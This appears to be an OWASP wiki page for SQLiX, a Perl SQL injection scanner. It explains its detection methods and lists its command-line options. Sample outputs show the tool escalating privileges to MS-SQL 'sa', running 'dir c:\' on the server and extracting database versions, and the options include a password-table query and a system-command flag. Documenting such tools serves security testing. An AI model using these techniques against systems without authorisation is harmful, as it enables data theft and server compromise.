# Main

<div style="width:100%;height:100px;border:0,margin:0;overflow: hidden;">

![OWASP_Inactive_Banner.jpg](OWASP_Inactive_Banner.jpg
"OWASP_Inactive_Banner.jpg")

</div>

<table>
<tbody>
<tr class="odd">
<td><p>valign="top" style="border-right: 1px dotted gray;padding-right:25px;"</p></td>
<td><p><strong>NOTE:</strong></p>
<p>The project is currently under the process of porting from Perl to Python. The next version will be released soon!<br />
-- AnirudhAnand, 16 March 2014</p>
<h2 id="introduction">Introduction</h2>
<p>SQLiX is a <a href="SQL_Injection" title="wikilink">SQL Injection</a> scanner coded in Perl. It is able to crawl, detect SQL injection vectors, identify the back-end database, and grab function call/UDF results (even execute system commands for MS-SQL). The concepts in use are different than the one used in other SQL injection scanners. SQLiX is able to find normal and blind SQL injection vectors and doesn't need to reverse engineer the original SQL request (using only function calls).</p>
<p>If you are a developer interested in remediating or avoiding the kinds of SQL injection vulnerabilities this tool can find, check out the OWASP <a href="SQL_Injection_Prevention_Cheat_Sheet" title="wikilink">SQL Injection Prevention Cheat Sheet</a>.</p>
<h2 id="description">Description</h2>
<p><strong>SQLiX</strong> is a <strong><a href="SQL_Injection" title="wikilink">SQL Injection</a> scanner</strong> which attempts to fill the gap between what commercial software available on the market can do and what can really be done to detect and identify SQL injection.</p>
<p>Current injection methods used by commercial web assessment software are based on error generation or statement injections.</p>
<p><strong>error generation:</strong></p>
<p>The error generation method is quite simple and is based on meta characters like single quotes or double quotes. By injecting these characters in the original SQL request, you generate a syntax error which could result in an SQL error message displayed in the HTTP reply. The main issue with this technique is the fact that it's only based on pattern matching. There is no way to handle multiple languages or complex behaviors when the error message is filtered by the server-side scripts.</p>
<p><strong>statement injection:</strong></p>
<p>The second method used is statement injection. Let's look at an example:</p>
<p>The target URL</p>
<p><code>(0) is </code><a href="http://target.example.com/news.php?id=25"><code>http://target.example.com/news.php?id=25</code></a><code>.</code></p>
<p>The scanner will try to compare the HTML content of the original request with the HTML content of</p>
<p><code>(1) </code><a href="http://target.example.com/news.php?id=25%20or%201=1"><code>http://target.example.com/news.php?id=25%20or%201=1</code></a><br />
<br />
<code>(2) </code><a href="http://target.example.com/news.php?id=25%20or%201=0"><code>http://target.example.com/news.php?id=25%20or%201=0</code></a></p>
<p>If the request (1) provides the same result as request (0) and request (2) doesn't, the scanner will conclude that SQL injection is possible. This method works fine, but is very limited by the syntax of the original request. If the original request contains parentheses, store procedures or function calls, this method will rarely work. Worse, if the variable is used by multiple SQL requests, all with different syntaxes, there is no automatic way to make them all work simultaneously.</p>
<p>Frequently you will see more advanced scanners like SQLBrute from <a href="http://www.justinclarke.com">www.justinclarke.com</a> trying to reverse engineer the original SQL syntax by injecting multiple requests with different sets of parentheses or comas. This method is a little more time consuming but does provide better results (for free), especially when error messages are not displayed.</p>
<p>Another global issue concerning SQL injection is the fact that pen testers frequently conclude that a given SQL injection vulnerability can't be exploited. By concluding this incorrect statement they are inviting their customers to not patch the vulnerability.</p>
<h2 id="licensing">Licensing</h2>
<p>OWASP SQLiX is free to use. It is licensed under the <a href="http://creativecommons.org/licenses/by-sa/3.0/">http://creativecommons.org/licenses/by-sa/3.0/</a> Creative Commons Attribution-ShareAlike 3.0 license], so you can copy, distribute and transmit the work, and you can adapt it, and use it commercially, but all provided that you attribute the work and if you alter, transform, or build upon this work, you may distribute the resulting work only under the same or similar license to this one.</p></td>
<td><p>valign="top" style="padding-left:25px;width:200px;border-right: 1px dotted gray;padding-right:25px;"</p></td>
<td><h2 id="what_is_sqlix">What is SQLiX?</h2>
<p>OWASP SQLiX provides:</p>
<ul>
<li>SQLiX uses multiple techniques to determine if the current server-side script is vulnerable to SQL Injection
<ul>
<li>conditional errors injection</li>
<li>blind injection based on integers, strings or statements</li>
<li>MS-SQL verbose error messages ("taggy" method)</li>
</ul></li>
<li>SQLiX using UDF (User defined functions) or function calls thus no need to reverse engineer the original SQL syntax</li>
<li>SQLix is able to identify the database version and gather sensitive information for the following SQL servers: MS-Access, MS-SQL, MySQL, Oracle and PostgreSQL.</li>
<li>The comparison module of SQLiX is able to deal with complex HTML contents even when they include dynamic ads</li>
<li>SQLiX contains an exploit module to demonstrate how a hacker could exploit the found SQL injection to gather sensitive information</li>
</ul>
<h2 id="presentation">Presentation</h2>
<p>Link to presentation</p>
<h2 id="project_leader">Project Leader</h2>
<p>Anirudh</p>
<h2 id="related_projects">Related Projects</h2></td>
<td><p>valign="top" style="padding-left:25px;width:200px;"</p></td>
<td><h2 id="quick_download">Quick Download</h2>
<p>OWASP SQLiX v1.0 is available for download <a href="http://cedri.cc/tools/SQLiX_v1.0.tar.gz"><strong>here</strong></a> or <a href="http://www.mediafire.com/?5lbt0tb1jee"><strong>here</strong></a>.</p>
<h2 id="news_and_events">News and Events</h2>
<ul>
<li>[20 Nov 2013] News 2</li>
<li>[30 Sep 2013] News 1</li>
</ul>
<h2 id="in_print">In Print</h2>
<h2 id="classifications">Classifications</h2>
<table>
<tbody>
<tr class="odd">
<td><p>align="center" valign="top" width="50%" rowspan="2"</p></td>
<td><figure>
<img src="Owasp-incubator-trans-85.png" title="Owasp-incubator-trans-85.png" alt="Owasp-incubator-trans-85.png" /><figcaption>Owasp-incubator-trans-85.png</figcaption>
</figure></td>
<td><p>align="center" valign="top" width="50%"</p></td>
<td><figure>
<img src="Owasp-builders-small.png" title="Owasp-builders-small.png" alt="Owasp-builders-small.png" /><figcaption>Owasp-builders-small.png</figcaption>
</figure></td>
</tr>
<tr class="even">
<td><p>align="center" valign="top" width="50%"</p></td>
<td><figure>
<img src="Owasp-defenders-small.png" title="Owasp-defenders-small.png" alt="Owasp-defenders-small.png" /><figcaption>Owasp-defenders-small.png</figcaption>
</figure></td>
<td></td>
<td></td>
</tr>
<tr class="odd">
<td><p>colspan="2" align="center"</p></td>
<td><figure>
<img src="Cc-button-y-sa-small.png" title="Cc-button-y-sa-small.png" alt="Cc-button-y-sa-small.png" /><figcaption>Cc-button-y-sa-small.png</figcaption>
</figure></td>
<td></td>
<td></td>
</tr>
<tr class="even">
<td><p>colspan="2" align="center"</p></td>
<td><figure>
<img src="Project_Type_Files_CODE.jpg" title="Project_Type_Files_CODE.jpg" alt="Project_Type_Files_CODE.jpg" /><figcaption>Project_Type_Files_CODE.jpg</figcaption>
</figure></td>
<td></td>
<td></td>
</tr>
</tbody>
</table></td>
</tr>
</tbody>
</table>

# Requirements

Perl with the following dependencies:

WWW::CheckSite

Tie::CharArray

`     perl -MCPAN -e 'install WWW::CheckSite'`
`     perl -MCPAN -e 'install Tie::CharArray'`

# Command line usage

**Usage: SQLiX.pl \[options\]**

`-help                              Show this help`

Target specification:

`-url [URL]                         Scan a given URL.`
`                                     Example: -url="`<http://target.com/index.php?id=1>`"`
`--post_content [CONTENT]           Add a content to the current [URL]`
`                                     and change the HTTP method to POST`
`-file [FILE_NAME]                  Scan a list of URI provided via a flat file.`
`                                     Example: -file="./crawling"`
`-crawl [ROOT_URL]                  Scan a web site from the given root URL.`
`                                     Example: -crawl="`<http://target.com/>`"`

Injection vectors:

`-referer                           Use HTTP referer as a potential injection vector.`
`-agent                             Use HTTP User agent as a potential injection vector.`
`-cookie [COOKIE]                   Use the cookie as a potential injection vector.`
`                                     Cookie value has to be specified and the injection area`
`                                     tagged as "--INJECT_HERE--".`
`                                     Example: -cookie="userID=--INJECT_HERE--"`

Injection methods:

`-all                               Use all the injection methods.`
`-method_taggy                      Use MS-SQL "verbose" error messages method.`
`-method_error                      Use conditional error messages injection method.`
`-method_blind                      Use all blind injection methods.`
`-method_blind_integer              Use integer blind injection method.`
`-method_blind_string               Use string blind injection method.`
`-method_blind_statement            Use statement blind injection method.`
`-method_blind_comment              Use MySQL comment blind injection method.`

Attack modules:

`-exploit                           Exploit the found injection to extract information.`
`                                     by default the version of the database will be retrieved`
`-function [function]               Used with exploit to retrieve a given function value.`
`                                     Example: -function="system_user"`
`                                     Example: -function="(select password from user_table)"`
`-union                             Analyse target for potential UNION attack [MS-SQL only].`

MS-SQL System command injection:

`-cmd [COMMAND]                     System command to be executed.`
`                                     Example: -cmd="dir c:\\"`
`-login [LOGIN]                     MS-SQL login to use if known.`
`-password [PASSWORD]               MS-SQL password to use if known.`

Verbosity:

`-v=[n]                             Verbose mode level`
`                                     v=0 => no output, only results are displayed at the end`
`                                     v=2 => realtime display, provide minimum result info`
`                                     v=5 => debug view [all url,content and headers are displayed]`

# Output example

  - **MS-SQL System command execution**

`$ perl SQLiX.pl -file crawling -all -v=2 -exploit -cmd="dir c:\\"`

`======================================================`
`                   -- SQLiX --`
` © Copyright 2006 Cedric COCHIN, All Rights Reserved.`
`======================================================`

`Analysing URI obtained by flat file [crawling]`
` `<http://www.target.example.com/DocumentDescription-HR.asp?DocID=2>
`      [+] working on DocID`
`            [+] Method: MS-SQL error message`
`                  [FOUND] MS-SQL error message (implicite without quotes)`
`                  [FOUND] function [@@version]:`
`                          Microsoft SQL Server  2000 - 8.00.534 (Intel X86) `
`                                 Nov 19 2001 13:23:50 `
`                                 Copyright (c) 1988-2000 Microsoft Corporation`
`                                 Personal Edition on Windows NT 5.0 (Build 2195: Service Pack 4)`
`                  [INFO] System command injector:`
`                  [INFO] Current database: HR`
`                  [INFO] We are not sysadmin for now`
`                  [INFO] Checking OpenRowSet availibility - please wait...`
`                        [INFO] Current user login: [HR]`
`                        [FOUND] OPENROWSET available - (login [sa] `

| password \[sa\])

`                        [INFO] Privilege escalation - from [HR] to [sa]`
`                                `
`                        ===========================================================================`

`                        Volume in drive C has no label.`
`                        Volume Serial Number is 00BC-6F73`
`                                `
`                        Directory of c:\`
`                                `
`                        11/21/2005  06:36p      `

<DIR>

403679d1f6ca54e5384256556434111d

`                        07/14/2006  10:49a      `

<DIR>

Documents and Settings

`                        07/22/2005  02:21p      `

<DIR>

honeypot

`                        07/21/2005  04:38p      `

<DIR>

iDefense

`                        03/08/2002  08:23a      `

<DIR>

Inetpub

`                        07/14/2006  03:21p      `

<DIR>

Program Files

`                        08/07/2006  04:11p                 622 tmp.txt`
`                        11/28/2005  06:06p      `

<DIR>

WINNT

`                                       1 File(s)            622 bytes`
`                                       7 Dir(s)     183,328,768 bytes free`
`                                `
`                                 `
`                        ===========================================================================`

`                  [FOUND] MS-SQL error message`
` `
`RESULTS:`
`The variable [DocID] from [ `<http://www.target.example.com/DocumentDescription-HR.asp?DocID=2>` ] ...`
`   ... is vulnerable to SQL Injection [TAG implicite without quotes - MSSQL].`

  - **MySQL, PostgreSQL function Injection**

`$ perl SQLiX.pl -file crawling -all -v=2 -exploit`

`======================================================`
`                   -- SQLiX --`
` © Copyright 2006 Cedric COCHIN, All Rights Reserved.`
`======================================================`

`Analysing URI obtained by flat file [crawling]`
` `<http://www.target.example.com/MySQL-DocumentDescriptionMagicQuote.asp?DocID=2>
`      [+] working on DocID`
`            [+] Method: MS-SQL error message`
`            [+] Method: SQL error message`
`                  [FOUND] Match found INPUT:[user] - "Microsoft OLE DB Provider for ODBC Drivers"`
`                  [INFO] Error without quote`
`                  [INFO] Database identified: MySQL Server`
`                  [INFO] Current function: version()`
`                  [INFO] length: 19`
`                      4.1.20-community-nt`
`                  [FOUND] SQL error message`
` `<http://www.target.example.com/PGSQL-DocumentDescription.asp?DocID=2>
`      [+] working on DocID`
`            [+] Method: MS-SQL error message`
`            [+] Method: SQL error message`
`                  [FOUND] Match found INPUT:['] - "Microsoft OLE DB Provider for ODBC Drivers"`
`                  [INFO] Error without quote`
`                  [INFO] Database identified: PostgreSQL Server`
`                  [INFO] Current function: version()`
`                  [INFO] length: 88`
`                      PostgreSQL 8.0.7 on i686-pc-mingw32, compiled by GCC gcc.exe (GCC) 3.4.2`
`                  [FOUND] SQL error message`

`RESULTS:`
`The variable [DocID] from `
`  [ `<http://www.target.example.com/MySQL-DocumentDescriptionMagicQuote.asp?DocID=2>` ] ...`
`   ... is vulnerable to SQL Injection [Error message (user) - MySQL].`
`The variable [DocID] from`
`  [ `<http://www.target.example.com/PGSQL-DocumentDescription.asp?DocID=2>` ] ...`
`   ... is vulnerable to SQL Injection [Error message (') - PostgreSQL].`

# Acknowledgements

## Volunteers

# Road Map and Getting Involved

As of XXX, the priorities are:

  - xxx
  - xxx
  - xxx

We hope you find the OWASP SQLiX Project useful. Please contribute to
the Project by volunteering for one of the Tasks, sending your comments,
questions, and suggestions to owasp@owasp.org. To join the OWASP SQLiX
Project mailing list or view the archives, please visit the
[subscription
page.](http://lists.owasp.org/mailman/listinfo/owasp-sqlix)

# Project About

#### Project Identification

}}

__NOTOC__ <headertabs />

[SQLiX Project](Category:OWASP_Project "wikilink") [Category:OWASP
Download](Category:OWASP_Download "wikilink") [Category:OWASP
Tool](Category:OWASP_Tool "wikilink")
[Category:SQL](Category:SQL "wikilink") [Category:OWASP Oracle
Project](Category:OWASP_Oracle_Project "wikilink")